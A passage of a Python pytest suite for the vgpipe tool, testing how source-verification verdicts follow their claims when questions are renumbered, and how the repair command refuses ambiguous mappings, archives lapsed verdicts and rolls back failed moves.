    (root / "claims" / f"{qid}.json").write_text(
        Claim(question_id=qid, question=f"old {qid}", answer=answer,
              sources=list(sources)).model_dump_json())


# Four distinct sources: shared (cited by two questions), and one private to each side.
SHARED = dict(url="https://sacbee.com/shared", publisher="Sacramento Bee")
ONLY_A = dict(url="https://calmatters.org/only-a")
ONLY_B = dict(url="https://latimes.com/only-b", publisher="LA Times")


def test_a_source_cited_by_two_questions_keeps_each_questions_verdict(tmp_path):
    """rehome() pooled every shard into one dict keyed by source id, so a source cited by two
    questions kept only the shard that sorted last — then filed that one verdict under the
    last claim citing it. On live data, 13 co-cited sources carried different verdicts per
    question, which is legitimate: a page can support one claim and be topic_only for another.
    Pooling deleted one and could put a `supports` on the claim a verifier judged topic_only."""
    from vgpipe import judgments

    shared, moving = src(**SHARED), src()
    for s in (shared, moving):
        _cache_judged_page(tmp_path, s.url)   # or every verdict reads stale: no page
    judgments.record(tmp_path, "qa", shared.sid, "supports", "supports claim A")
    judgments.record(tmp_path, "qb", shared.sid, "topic_only", "only on-topic for claim B")
    # something has to move, or rehome() has nothing to rewrite
    judgments.record(tmp_path, "q21", moving.sid, "supports", "follows its claim")
    # one Source object per claim, as loading them from disk gives: apply_to() writes onto it
    claims = [Claim(question_id="qa", question="A", answer="a", sources=[src(**SHARED)]),
              Claim(question_id="qb", question="B", answer="b", sources=[src(**SHARED)]),
              Claim(question_id="q18", question="moved", answer="m", sources=[moving])]

    rehomed, orphaned, touched, _ = judgments.rehome(tmp_path, claims, {"q21": "q18"})
    assert (rehomed, orphaned, touched) == (3, 0, ["q18", "qa", "qb"])
    assert judgments.load(tmp_path, "qa")[shared.sid].note == "supports claim A"
    assert judgments.load(tmp_path, "qb")[shared.sid].note == "only on-topic for claim B"
    for c in claims:
        judgments.apply_to(c, tmp_path, cache_root=tmp_path)
    assert [c.sources[0].verification.support for c in claims] == [
        "supports", "topic_only", "supports"]


def test_a_rehome_with_nothing_to_move_rewrites_nothing(tmp_path):
    """The steady state — every verdict already home, co-cited sources included — is exactly
    what `vg judgments --repair` meets when run to be safe. It must leave the files alone."""
    from vgpipe import judgments

    shared = src(**SHARED)
    judgments.record(tmp_path, "qa", shared.sid, "supports")
    judgments.record(tmp_path, "qb", shared.sid, "topic_only")
    before = _shards(tmp_path)
    claims = [Claim(question_id=q, question="?", answer="a", sources=[shared])
              for q in ("qa", "qb")]
    assert judgments.rehome(tmp_path, claims) == (2, 0, ["qa", "qb"], 0)
    assert _shards(tmp_path) == before
    assert not judgments.archive_dir(tmp_path).exists()
    assert not judgments.backup_dir(tmp_path).exists()


def _renumbered_run(tmp_path, *, judge_old_q18_shared=True):
    """q18 → q20 and q20 → q22, over ids that overlap, where both claims cite SHARED and hold
    different verdicts for it. After the claims move, shard q20 is the OLD q20's verdicts while
    claim q20 is the old q18 — and both cite SHARED, so "q20 cites it" is true of the wrong
    claim. Only the mapping says which shard judged which claim."""
    from vgpipe import judgments

    shared, a, b = src(**SHARED), src(**ONLY_A), src(**ONLY_B)
    _claim_file(tmp_path, "q18", shared, a, answer="old q18")
    _claim_file(tmp_path, "q20", shared, b, answer="old q20")
    if judge_old_q18_shared:
        judgments.record(tmp_path, "q18", shared.sid, "supports", "judged for old q18")
    judgments.record(tmp_path, "q18", a.sid, "supports", "judged for old q18")
    judgments.record(tmp_path, "q20", shared.sid, "topic_only", "judged for old q20")
    judgments.record(tmp_path, "q20", b.sid, "topic_only", "judged for old q20")
    (tmp_path / "questions.json").write_text(json.dumps([
        {"id": "q20", "text": "new q20", "claim_type": "mechanical", "maps_from": "q18"},
        {"id": "q22", "text": "new q22", "claim_type": "mechanical", "maps_from": "q20"},
    ]))
    return shared, a, b


def test_remap_moves_each_shard_with_its_own_claim(tmp_path):
    """The mapping-driven path. Pooled by sid, SHARED's two verdicts collapsed into one and
    landed on whichever claim cited it last; filed by "does this question cite it", old q20's
    topic_only would have stayed on q20 — now the old q18's claim — as a verdict it never got."""
    from vgpipe import cli, judgments

    shared, a, b = _renumbered_run(tmp_path)
    cli.remap(data=tmp_path, apply=True)

    q20, q22 = judgments.load(tmp_path, "q20"), judgments.load(tmp_path, "q22")
    assert (q20[shared.sid].verdict, q20[shared.sid].note) == ("supports", "judged for old q18")
    assert (q22[shared.sid].verdict, q22[shared.sid].note) == ("topic_only", "judged for old q20")
    assert set(q20) == {shared.sid, a.sid} and set(q22) == {shared.sid, b.sid}
    assert not judgments.path_for(tmp_path, "q18").exists()


@pytest.mark.parametrize("judge_old_q18_shared", [
    pytest.param(True, id="both-judged"),
    # Old q18 never judged SHARED, so nothing competes for it — only the sibling verdicts
    # leaving shard q20 for q22 show that SHARED's verdict in q20 may have been q22's all along.
    pytest.param(False, id="only-old-q20-judged"),
])
def test_repair_refuses_a_verdict_it_cannot_place(tmp_path, capsys, judge_old_q18_shared):
    """`vg judgments --repair` has no mapping: it meets a run whose claims already moved and
    must infer the rest from source ids. With co-cited sources that inference has two readings,
    and choosing one silently is how a verdict ends up on a claim it never judged."""
    import shutil

    import typer

    from vgpipe import cli, judgments

    _renumbered_run(tmp_path, judge_old_q18_shared=judge_old_q18_shared)
    # the claims moved under an older remap that did not re-home their verdicts
    claims = tmp_path / "claims"
    shutil.move(claims / "q20.json", claims / "q22.json")
    shutil.move(claims / "q18.json", claims / "q20.json")
    for qid in ("q20", "q22"):
        c = json.loads((claims / f"{qid}.json").read_text())
        (claims / f"{qid}.json").write_text(json.dumps({**c, "question_id": qid}))
    before = _shards(tmp_path)

    with pytest.raises(typer.Exit) as exc:
        cli.show_judgments(data=tmp_path, repair=True)
    assert exc.value.exit_code == 1
    out = " ".join(re.sub(r"\x1b\[[0-9;]*m", "", capsys.readouterr().out).split())
    assert "cannot tell which question" in out and "nothing was changed" in out
    assert _shards(tmp_path) == before
    assert not judgments.archive_dir(tmp_path).exists()


def test_repair_never_moves_a_verdict_out_of_a_vacant_id_on_a_source_id(tmp_path):
    """--repair used to move a verdict out of an id no current claim holds, to the one other
    question citing its source. A vacant id is evidence of a move, not proof: a claim deleted or
    hand-archived outside `vg remap` leaves the same trace, and its verdict then rendered green
    on a claim that happens to cite the same page. Only a mapping moves a verdict."""
    from vgpipe import judgments

    s1, s2 = src(), src(**ONLY_B)
    judgments.record(tmp_path, "q21", s1.sid, "supports", "climate verdict")
    judgments.record(tmp_path, "q21", s2.sid, "topic_only", "second climate verdict")
    judgments.record(tmp_path, "q40", "deadbeef1234", "supports", "its claim is gone")
    before = _shards(tmp_path)
    moved = Claim(question_id="q18", question="climate", answer="a", sources=[s1, s2])

    with pytest.raises(judgments.CannotRehome) as exc:
        judgments.rehome(tmp_path, [moved])
    msg = str(exc.value)
    assert f"q21/{s1.sid}: no claim holds q21; also cited by q18" in msg
    assert f"q21/{s2.sid}" in msg and "q40" not in msg, "nothing cites q40's: it just lapsed"
    assert f"--data {tmp_path}" in msg, "a bare --repair would re-home the default data/ run"
    assert _shards(tmp_path) == before
    assert not judgments.archive_dir(tmp_path).exists()

    # a vacant shard nothing cites has lapsed on any reading, so it is archived, not refused
    judgments.path_for(tmp_path, "q21").unlink()
    assert judgments.rehome(tmp_path, [moved]) == (0, 1, [], 0)
    assert not judgments.path_for(tmp_path, "q40").exists()


def test_repair_moves_a_verdict_out_of_a_vacant_id_along_the_mapping(tmp_path):
    """The case --repair exists for: a claim moved and nothing took its old id. The operator
    says where it went, and its verdicts follow."""
    from vgpipe import judgments

    s1, s2 = src(), src(**ONLY_B)
    judgments.record(tmp_path, "q21", s1.sid, "supports", "climate verdict")
    judgments.record(tmp_path, "q21", s2.sid, "topic_only", "second climate verdict")
    moved = Claim(question_id="q18", question="climate", answer="a", sources=[s1, s2])

    assert judgments.rehome(tmp_path, [moved], {"q21": "q18"}) == (2, 0, ["q18"], 2)
    assert {sid: j.note for sid, j in judgments.load(tmp_path, "q18").items()} == {
        s1.sid: "climate verdict", s2.sid: "second climate verdict"}
    assert not judgments.path_for(tmp_path, "q21").exists()


def test_repair_does_not_hand_a_lapsed_verdict_to_another_claim(tmp_path):
    """A retry changed q1's quote, so its verdict for the old one lapsed. q2 independently cites
    that same source and has no verdict for it. Filing q1's verdict there renders q2's row green
    from a judgment about a different claim — and nothing in the data distinguishes this from
    q1's claim having moved to q2, so --repair must not choose."""
    from vgpipe import judgments

    shared = src(**SHARED)
    judgments.record(tmp_path, "q1", shared.sid, "supports", "supports q1's claim")
    before = _shards(tmp_path)
    claims = [Claim(question_id="q1", question="?", answer="a", sources=[src(**ONLY_A)]),
              Claim(question_id="q2", question="?", answer="b", sources=[src(**SHARED)])]

    with pytest.raises(judgments.CannotRehome, match=re.escape(f"q1/{shared.sid}")):
        judgments.rehome(tmp_path, claims)
    assert _shards(tmp_path) == before


def _flat(out: str) -> str:
    """CLI output with rich's line wrapping undone, so a message can be matched whole."""
    return " ".join(out.split())


def test_repair_re_homes_along_the_mapping_it_is_given(tmp_path):
    """The acceptance case of test_moving_a_claim_does_not_orphan_its_verdicts, driven through
    the CLI. q21 is held by another claim, so nothing on disk says its verdicts moved rather
    than lapsed: --repair refuses without the mapping, and follows it exactly with one."""
    from vgpipe import judgments

    s1, s2 = src(), src(url="https://sacbee.com/b", publisher="Sacramento Bee")
    judgments.record(tmp_path, "q21", s1.sid, "supports", "climate verdict")
    judgments.record(tmp_path, "q21", s2.sid, "topic_only", "second climate verdict")
    _claim_file(tmp_path, "q18", s1, s2)
    _claim_file(tmp_path, "q21")
    before = _shards(tmp_path)

    code, out = _judgments_output(tmp_path, "--repair")
    out = _flat(out)
    assert code == 1 and "nothing was changed" in out
    assert f"q21/{s1.sid}: the claim at q21 no longer cites it; also cited by q18" in out
    assert _shards(tmp_path) == before

    _code, out = _judgments_output(tmp_path, "--repair", "--moved", "q21:q18")
    assert "re-homed 2 verdict(s)" in _flat(out)
    assert {sid: (j.verdict, j.note) for sid, j in judgments.load(tmp_path, "q18").items()} == {
        s1.sid: ("supports", "climate verdict"), s2.sid: ("topic_only", "second climate verdict")}
    assert not judgments.path_for(tmp_path, "q21").exists()
    assert not judgments.archive_dir(tmp_path).exists()


def test_repair_settles_a_lapsed_co_cited_verdict_only_when_told(tmp_path):
    """The refusal a smoke run of --repair hit on a live run: q26's shard held a
    verdict for a CalMatters page its education claim had since dropped (a routine retry), and
    q11 cites the same page. On disk that is identical to q26's claim having moved to q11.
    `--moved q26:q26` says it did not move, so the verdict lapsed and is archived. The wrong
    answer, `--moved q26:q11`, is refused — because the claims contradict it: q26's shard holds
    verdicts q26's claim still cites, and q11's holds its own."""
    from vgpipe import judgments

    page, kept, own = src(**SHARED), src(**ONLY_A), src(**ONLY_B)
    judgments.record(tmp_path, "q26", kept.sid, "supports", "education")
    judgments.record(tmp_path, "q26", page.sid, "supports", "education, since dropped")
    judgments.record(tmp_path, "q11", own.sid, "topic_only", "issues in the race")
    _claim_file(tmp_path, "q26", kept)
    _claim_file(tmp_path, "q11", src(**SHARED), own)
    before = _shards(tmp_path)

    code, out = _judgments_output(tmp_path, "--repair")
    assert code == 1
    assert f"q26/{page.sid}: the claim at q26 no longer cites it; also cited by q11" in _flat(out)

    code, out = _judgments_output(tmp_path, "--repair", "--moved", "q26:q11")
    out = _flat(out)
    assert code == 1 and "nothing was changed" in out
    assert (f"q26/{kept.sid}: the mapping says q26's shard judged the claim now at q11, which "
            f"does not cite it, but the claim now at q26 does") in out
    assert (f"q11/{own.sid}: q26 moved onto q11, and nothing says which claim q11's own shard "
            f"judged; also cited by q11") in out
    assert _shards(tmp_path) == before
    assert not judgments.archive_dir(tmp_path).exists()

    _code, out = _judgments_output(tmp_path, "--repair", "--moved", "q26:q26")
    # nothing moved, and the count says so: a mapping that matches nothing must not read as
    # one that worked
    assert "re-homed 0 verdict(s); 2 filed" in (out := _flat(out)) and "archived 1 under" in out
    assert set(judgments.load(tmp_path, "q26")) == {kept.sid}
    assert {sid: j.note for sid, j in judgments.load(tmp_path, "q11").items()} == {
        own.sid: "issues in the race"}, "q11 gains nothing from q26's shard"
    (archived,) = judgments.archive_dir(tmp_path).iterdir()
    assert [e["sid"] for e in json.loads((archived / "q26.json").read_text())] == [page.sid]


def test_repair_refuses_a_mapping_that_describes_verdicts_already_re_homed(tmp_path):
    """Re-applying a finished migration's mapping moves every verdict a second time — the
    reason --repair does not read one from maps_from. The shards give it away: each holds
    verdicts its own claim cites and the mapped one does not."""
    from vgpipe import cli, judgments

    _renumbered_run(tmp_path)
    cli.remap(data=tmp_path, apply=True)          # claims and verdicts both moved: done
    after = _shards(tmp_path)

    code, out = _judgments_output(tmp_path, "--repair", "--moved", "q18:q20",
                                  "--moved", "q20:q22")
    assert code == 1 and "the mapping was applied already and the verdicts re-homed" in _flat(out)
    assert _shards(tmp_path) == after


def test_repair_follows_a_renumbering_it_is_told_about(tmp_path):
    """The run --repair was written for: an older remap moved the claims (q18 → q20, q20 → q22)
    and left the verdicts. Both claims cite SHARED with different verdicts, so no source id can
    say which shard judged which — the mapping does."""
    import shutil

    from vgpipe import judgments

    shared, a, b = _renumbered_run(tmp_path)
    claims = tmp_path / "claims"
    shutil.move(claims / "q20.json", claims / "q22.json")
    shutil.move(claims / "q18.json", claims / "q20.json")
    for qid in ("q20", "q22"):
        c = json.loads((claims / f"{qid}.json").read_text())
        (claims / f"{qid}.json").write_text(json.dumps({**c, "question_id": qid}))

    _code, out = _judgments_output(tmp_path, "--repair", "--moved", "q18:q20",
                                   "--moved", "q20:q22")
    assert "re-homed 4 verdict(s)" in _flat(out)
    q20, q22 = judgments.load(tmp_path, "q20"), judgments.load(tmp_path, "q22")
    assert (q20[shared.sid].verdict, q20[shared.sid].note) == ("supports", "judged for old q18")
    assert (q22[shared.sid].verdict, q22[shared.sid].note) == ("topic_only", "judged for old q20")
    assert set(q20) == {shared.sid, a.sid} and set(q22) == {shared.sid, b.sid}
    assert not judgments.path_for(tmp_path, "q18").exists()


@pytest.mark.parametrize("args, says", [
    pytest.param(["--moved", "q21:q18"], "--moved and --gone are the mapping for --repair",
                 id="no-repair"),
    pytest.param(["--gone", "q21"], "--moved and --gone are the mapping for --repair",
                 id="gone-no-repair"),
    pytest.param(["--repair", "--moved", "q21"], "'q21' is not OLD:NEW", id="no-colon"),
    pytest.param(["--repair", "--moved", "q21:q18:q20"], "is not OLD:NEW", id="two-colons"),
    pytest.param(["--repair", "--moved", "../x:q18"], "is neither a question id nor a shard",
                 id="not-an-id"),
    # a typo'd NEW would archive every verdict in OLD's shard instead of moving it
    pytest.param(["--repair", "--moved", "q21:q1B"], "no current claim is on q1B", id="typo"),
    # a dict would keep only the last of the two
    pytest.param(["--repair", "--moved", "q21:q18", "--moved", "q21:q20"],
                 "q21 is already mapped to q18", id="old-twice"),
    # OLD:OLD means "its claim is gone" only for a shard that exists
    pytest.param(["--repair", "--moved", "q4O:q4O"], "no shard is named q4O",
                 id="identity-typo"),
    # OLD:OLD means "still on OLD"; a claim that is gone is --gone, which the refusal names
    pytest.param(["--repair", "--moved", "q21:q21"], "say --gone q21", id="identity-vacant"),
    pytest.param(["--repair", "--gone", "q99"], "no verdict shard is named q99",
                 id="gone-no-shard"),
    pytest.param(["--repair", "--moved", "q21:q18", "--gone", "q21"],
                 "q21 is already mapped to q18", id="moved-and-gone"),
])
def test_repair_refuses_a_mapping_it_cannot_apply_as_written(tmp_path, args, says):
    from vgpipe import judgments

    moving = src()
    judgments.record(tmp_path, "q21", moving.sid, "supports", "moves with its claim")
    _claim_file(tmp_path, "q18", moving)
    _claim_file(tmp_path, "q20")
    before = _shards(tmp_path)

    code, out = _judgments_output(tmp_path, *args)
    assert code == 1 and says in _flat(out)
    assert _shards(tmp_path) == before
    assert not judgments.archive_dir(tmp_path).exists()


def _shard(root: Path, qid: str, *verdicts: tuple[str, str, str]):
    """Write a shard whose verdicts carry the judged_at given: (sid, note, judged_at)."""
    from vgpipe import judgments

    judgments._write(judgments.path_for(root, qid),
                     [judgments.Judgment(sid=sid, verdict="supports", note=note, judged_at=at)
                      for sid, note, at in verdicts])


EARLIER, LATER = "2026-08-20T10:00:00+00:00", "2026-08-22T18:25:41+00:00"


def test_repair_merges_what_a_claim_was_judged_before_and_after_it_moved(tmp_path):
    """The usual state an older remap left: the claim moved q12 → q18 without its verdicts, so
    its sources showed as unreviewed on q18 and a verifier judged them there. Both shards hold
    verdicts for the claim now at q18, and only the operator can say so; where both judged one
    source, the later replaces the earlier as a re-judgment does, and the earlier is kept.
    (q12 sorts first, so the earlier verdict is also the first one read.)"""
    from vgpipe import judgments

    s1, s2, s3 = src(), src(**ONLY_A), src(**ONLY_B)
    _shard(tmp_path, "q12", (s1.sid, "before the move", EARLIER),
           (s2.sid, "before the move", EARLIER))
    _shard(tmp_path, "q18", (s1.sid, "judged again since", LATER),
           (s3.sid, "judged since", LATER))
    _claim_file(tmp_path, "q18", s1, s2, s3)
    before = _shards(tmp_path)

    # q18's own shard judged either the claim there before q12's arrived, or q12's since
    code, out = _judgments_output(tmp_path, "--repair", "--moved", "q12:q18")
    assert code == 1
    assert (f"q18/{s3.sid}: q12 moved onto q18, and nothing says which claim q18's own shard "
            f"judged; also cited by q18") in _flat(out)
    assert _shards(tmp_path) == before

    _code, out = _judgments_output(tmp_path, "--repair", "--moved", "q12:q18",
                                   "--moved", "q18:q18")
    assert "re-homed 1 verdict(s); 3 filed" in (out := _flat(out)) and "archived 1 under" in out
    assert {sid: j.note for sid, j in judgments.load(tmp_path, "q18").items()} == {
        s1.sid: "judged again since", s2.sid: "before the move", s3.sid: "judged since"}
    (archived,) = judgments.archive_dir(tmp_path).iterdir()
    assert json.loads((archived / "q12.json").read_text())[0]["note"] == "before the move"


def test_repair_refuses_two_verdicts_it_cannot_put_in_order(tmp_path):
    from vgpipe import judgments

    s1 = src()
    _shard(tmp_path, "q21", (s1.sid, "one", LATER))
    _shard(tmp_path, "q18", (s1.sid, "the other", LATER))
    _claim_file(tmp_path, "q18", s1)
    before = _shards(tmp_path)

    code, out = _judgments_output(tmp_path, "--repair", "--moved", "q21:q18",
                                  "--moved", "q18:q18")
    assert code == 1 and f"q18/{s1.sid}: q18, q21 each hold a verdict for it" in _flat(out)
    assert "cannot be put in order" in _flat(out)
    assert _shards(tmp_path) == before


def test_repair_does_not_take_a_partial_mapping_as_the_whole_story(tmp_path):
    """An older remap moved q18 → q30 and q21 → q18. Told only q21:q18, --repair used to read
    q18's shard as judging a claim that is gone, and archived a verdict q30's claim — the old
    q18 — earned and still cites. That is the lapsed-or-moved guess again, one level out."""
    from vgpipe import judgments

    earned, moving = src(**SHARED), src()
    judgments.record(tmp_path, "q18", earned.sid, "supports", "judged for old q18, now q30")
    judgments.record(tmp_path, "q21", moving.sid, "supports", "judged for old q21, now q18")
    _claim_file(tmp_path, "q30", earned)
    _claim_file(tmp_path, "q18", moving)
    before = _shards(tmp_path)

    code, out = _judgments_output(tmp_path, "--repair", "--moved", "q21:q18")
    assert code == 1 and (f"q18/{earned.sid}: q21 moved onto q18, and nothing says which claim "
                          f"q18's own shard judged; also cited by q30") in _flat(out)
    assert _shards(tmp_path) == before

    _code, out = _judgments_output(tmp_path, "--repair", "--moved", "q21:q18",
                                   "--moved", "q18:q30")
    assert "re-homed 2 verdict(s)" in _flat(out)
    assert judgments.load(tmp_path, "q30")[earned.sid].note == "judged for old q18, now q30"
    assert judgments.load(tmp_path, "q18")[moving.sid].note == "judged for old q21, now q18"


def test_repair_archives_the_verdicts_of_a_claim_it_is_told_is_gone(tmp_path):
    """A claim deleted by hand leaves its shard on a vacant id. Its verdict for a page q12 also
    cites is refused without a word from the operator; `--gone q40` is that word, and the
    verdict is archived inside the transaction rather than moved by hand."""
    from vgpipe import judgments

    page = src(**SHARED)
    judgments.record(tmp_path, "q40", page.sid, "supports", "for a claim deleted by hand")
    _claim_file(tmp_path, "q12", src(**SHARED))

    code, out = _judgments_output(tmp_path, "--repair")
    assert code == 1 and f"q40/{page.sid}: no claim holds q40; also cited by q12" in _flat(out)

    _code, out = _judgments_output(tmp_path, "--repair", "--gone", "q40")
    assert "archived 1 under" in _flat(out)
    assert not judgments.path_for(tmp_path, "q40").exists()
    assert not judgments.path_for(tmp_path, "q12").exists(), "q12 gains nothing"


def test_repair_can_say_a_claim_is_gone_when_another_took_its_id(tmp_path):
    """An older remap with --archive-stranded archived q22's claim and moved q20's onto q22;
    both cite one CalMatters page. q22's shard judged the archived claim. `--moved q22:q22`
    would say it judged the claim now there — false, and it would file the archived claim's
    `supports` under the new one — so the refusal points at `--gone q22` instead, which says
    what happened."""
    from vgpipe import judgments

    page, other = src(**SHARED), src(**ONLY_A)
    judgments.record(tmp_path, "q22", page.sid, "supports", "for the claim archived as stranded")
    judgments.record(tmp_path, "q20", page.sid, "topic_only", "for the claim now at q22")
    judgments.record(tmp_path, "q20", other.sid, "supports", "for the claim now at q22")
    _claim_file(tmp_path, "q22", src(**SHARED), other)
    before = _shards(tmp_path)

    code, out = _judgments_output(tmp_path, "--repair", "--moved", "q20:q22")
    out = _flat(out)
    assert code == 1 and f"q22/{page.sid}: q20 moved onto q22" in out and "--gone OLD" in out
    assert _shards(tmp_path) == before

    _code, out = _judgments_output(tmp_path, "--repair", "--moved", "q20:q22", "--gone", "q22")
    assert "re-homed 2 verdict(s)" in _flat(out) and "archived 1 under" in _flat(out)
    assert {sid: j.note for sid, j in judgments.load(tmp_path, "q22").items()} == {
        page.sid: "for the claim now at q22", other.sid: "for the claim now at q22"}
    (archived,) = judgments.archive_dir(tmp_path).iterdir()
    assert json.loads((archived / "q22.json").read_text())[0]["note"] == \
        "for the claim archived as stranded"


def test_repair_does_not_map_a_deleted_claim_onto_one_that_shares_a_page(tmp_path):
    """The claim at q2 was deleted by hand; its shard holds two `supports`, one for a page q7
    also cites. The bare refusal used to read "no claim holds q2, and q7 cites it" — and
    `--moved q2:q7` then exited 0, filing q2's verdict green on q7, which no verifier judged
    against that page, and archiving the other as lapsed. Out of an id no claim holds nothing
    contradicts a mapping, so the shard has to bear it out: a claim that moved keeps its
    sources, and q7 does not cite the other page."""
    from vgpipe import judgments

    shared, own = src(**SHARED), src(**ONLY_B)
    judgments.record(tmp_path, "q2", shared.sid, "supports", "for q2's deleted claim")
    judgments.record(tmp_path, "q2", own.sid, "supports", "for q2's deleted claim")
    _claim_file(tmp_path, "q7", src(**SHARED))
    before = _shards(tmp_path)

    code, out = _judgments_output(tmp_path, "--repair")
    out = _flat(out)
    assert code == 1 and f"q2/{shared.sid}: no claim holds q2; also cited by q7" in out
    # it names q7 as a fact, and says outright that it is no answer
    assert "is not a candidate for where a claim went" in out and ", and q7 cites it" not in out

    code, out = _judgments_output(tmp_path, "--repair", "--moved", "q2:q7")
    out = _flat(out)
    assert code == 1 and "nothing was changed" in out
    assert (f"q2/{own.sid}: the mapping says q2's shard judged the claim now at q7, which does "
            f"not cite it") in out and "say `--gone OLD`" in out
    assert _shards(tmp_path) == before
    assert not judgments.archive_dir(tmp_path).exists()

    _code, out = _judgments_output(tmp_path, "--repair", "--gone", "q2")
    assert "archived 2 under" in _flat(out)
    assert not judgments.path_for(tmp_path, "q7").exists(), "q7 gains nothing"


def test_repair_notes_a_mapping_that_names_no_shard(tmp_path):
    """Not refused: `q9:q18` with no q9 shard still says the claim at q18 came from q9. But a
    typo'd OLD reads exactly like that, so it is pointed out."""
    from vgpipe import judgments

    moving = src()
    judgments.record(tmp_path, "q21", moving.sid, "supports", "moves with its claim")
    _claim_file(tmp_path, "q18", moving)

    _code, out = _judgments_output(tmp_path, "--repair", "--moved", "q21:q18",
                                   "--moved", "q2l:q20")
    assert "no current claim is on q20" in _flat(out)
    _claim_file(tmp_path, "q20")
    _code, out = _judgments_output(tmp_path, "--repair", "--moved", "q21:q18",
                                   "--moved", "q2l:q20")
    assert "note: no verdict shard is named q2l" in _flat(out)
    assert judgments.load(tmp_path, "q18")[moving.sid].note == "moves with its claim"


def test_remap_archives_a_lapsed_verdict_its_mapping_does_not_name(tmp_path):
    """remap's mapping is complete and its claims move inside the re-home, so a verdict its
    claim no longer cites has lapsed whoever else cites the source. The refusal --repair needs
    for that case would only block remap on a routine retry — `exact=True` keeps them apart."""
    from vgpipe import cli, judgments

    _shared, a, _b = _renumbered_run(tmp_path)
    _claim_file(tmp_path, "q5", src(url="https://example.org/q5"))
    judgments.record(tmp_path, "q5", a.sid, "supports", "q5 dropped it; new q20 cites it")

    cli.remap(data=tmp_path, apply=True)
    assert not judgments.path_for(tmp_path, "q5").exists()
    assert judgments.load(tmp_path, "q20")[a.sid].note == "judged for old q18"
    (archived,) = judgments.archive_dir(tmp_path).iterdir()
    assert json.loads((archived / "q5.json").read_text())[0]["note"] == \
        "q5 dropped it; new q20 cites it"


@pytest.mark.parametrize("fail", [
    pytest.param("shard", id="re-home-fails"),
    # the claim writes run inside the re-home's transaction, after every shard is written
    pytest.param("claim", id="claim-move-fails"),
])
def test_a_remap_that_fails_midway_leaves_the_verdicts_as_they_were(tmp_path, monkeypatch,
                                                                    capsys, fail):
    """The mapping exists only in the remap that applies it, so verdicts and claims have to move
    together. remap used to move the claim files and then re-home: a re-home that failed left
    claims on new ids with no way to finish. Re-homing first only flipped the failure: claims that
    then failed to move left verdicts filed under ids their claims do not have, and retrying the
    remap would move them again."""
    import typer

    from vgpipe import cli, judgments

    _renumbered_run(tmp_path)
    claims_before = {p.name: p.read_bytes() for p in (tmp_path / "claims").iterdir()}
    shards_before = _shards(tmp_path)
    if fail == "shard":
        _fail_write(monkeypatch)
    else:
        real = Path.write_text

        def full_disk(self, *a, **kw):
            if self.parent.name == "claims":
                raise OSError(28, "No space left on device")
            return real(self, *a, **kw)

        monkeypatch.setattr(Path, "write_text", full_disk)
    with pytest.raises(typer.Exit) as exc:
        cli.remap(data=tmp_path, apply=True)
    assert exc.value.exit_code == 1
    out = " ".join(re.sub(r"\x1b\[[0-9;]*m", "", capsys.readouterr().out).split())
    assert "Nothing moved" in out
    # claims and verdicts both exactly as they were: the claim moves are in the transaction
    assert {p.name: p.read_bytes() for p in (tmp_path / "claims").iterdir()} == claims_before
    assert _shards(tmp_path) == shards_before
    assert not judgments.backup_dir(tmp_path).exists()

    # so the remap can simply be re-run
    monkeypatch.undo()
    cli.remap(data=tmp_path, apply=True)
    assert judgments.load(tmp_path, "q22")[src(**SHARED).sid].note == "judged for old q20"
    assert judgments.load(tmp_path, "q20")[src(**SHARED).sid].note == "judged for old q18"


def test_a_stuck_lock_holder_stops_a_verdict_write_loudly(tmp_path, monkeypatch):
    """Verifier agents record through `vg judge`. Blocked forever behind a stuck process, they
    would report nothing, and silence from a verifier reads as nothing to report."""
    import fcntl
    import os

    from vgpipe import judgments

    judgments.record(tmp_path, "q1", src().sid, "supports")
    monkeypatch.setattr(judgments, "LOCK_TIMEOUT", 0.2)
    fd = os.open(tmp_path / "judgments", os.O_RDONLY)
    try:
        fcntl.flock(fd, fcntl.LOCK_SH)      # a reader that never lets go
        with pytest.raises(judgments.UnreadableJudgments, match="locked by another vg process"):
            judgments.record(tmp_path, "q1", src(**ONLY_B).sid, "topic_only")
    finally:
        os.close(fd)
    assert len(judgments.load(tmp_path, "q1")) == 1


def test_remap_moves_the_verdicts_of_a_claim_filed_under_another_name(tmp_path):
    """Shards are named by the question id a claim carries; remap's moves are named by claim
    FILE. A claim saved as q5.json but carrying q05 has its verdicts in q05.json, and a mapping
    keyed by file name missed them — the claim moved to q8 and its verdicts stayed behind."""
    from vgpipe import cli, judgments

    s = src(**SHARED)
    (tmp_path / "claims").mkdir()
    (tmp_path / "claims" / "q5.json").write_text(
        Claim(question_id="q05", question="old", answer="a", sources=[s]).model_dump_json())
    judgments.record(tmp_path, "q05", s.sid, "supports", "judged as q05")
    (tmp_path / "questions.json").write_text(json.dumps(
        [{"id": "q8", "text": "new q8", "claim_type": "mechanical", "maps_from": "q5"}]))

    cli.remap(data=tmp_path, apply=True)
    assert judgments.load(tmp_path, "q8")[s.sid].note == "judged as q05"
    assert not judgments.path_for(tmp_path, "q05").exists()


def test_remap_refuses_while_a_claim_cannot_be_read(tmp_path, capsys):
    """A claim that fails validation is skipped with a warning, so to rehome() it cites
    nothing: its verdicts would be archived out of the live shards while remap still moved its
    raw file. Once fixed, every one of its sources would read as unreviewed."""
    import typer

    from vgpipe import cli, judgments

    _renumbered_run(tmp_path)
    (tmp_path / "claims" / "q7.json").write_text(json.dumps({"question_id": "q7"}))
    claims_before = {p.name: p.read_bytes() for p in (tmp_path / "claims").iterdir()}
    shards_before = _shards(tmp_path)
    with pytest.raises(typer.Exit) as exc:
        cli.remap(data=tmp_path, apply=True, archive_stranded=True)
    assert exc.value.exit_code == 1
    assert "cannot be read" in re.sub(r"\x1b\[[0-9;]*m", "", capsys.readouterr().out)
    assert {p.name: p.read_bytes() for p in (tmp_path / "claims").iterdir()} == claims_before
    assert _shards(tmp_path) == shards_before
    assert not judgments.archive_dir(tmp_path).exists()


def test_remap_keeps_the_verdicts_of_a_claim_it_archives(tmp_path):
    """`remap --archive-stranded` moves a stranded claim to claims-archive/ and then re-homed
    by sid: the archived claim's verdicts counted as orphans and were deleted, so restoring the
    claim meant re-running its judgment pass. Worse, its shard keeps an id that another claim
    is moving onto — and a verdict there for a source both cite would have stayed attached to
    the newcomer."""
    from vgpipe import cli, judgments

    shared = src(**SHARED)
    _claim_file(tmp_path, "q3", shared, answer="IE committees — nothing maps away from this")
    _claim_file(tmp_path, "q4", shared, answer="who funds them")
    judgments.record(tmp_path, "q3", shared.sid, "contradicts", "judged for the stranded q3")
    judgments.record(tmp_path, "q4", shared.sid, "supports", "judged for q4")
    (tmp_path / "questions.json").write_text(json.dumps(
        [{"id": "q3", "text": "new q3", "claim_type": "mechanical", "maps_from": "q4"}]))

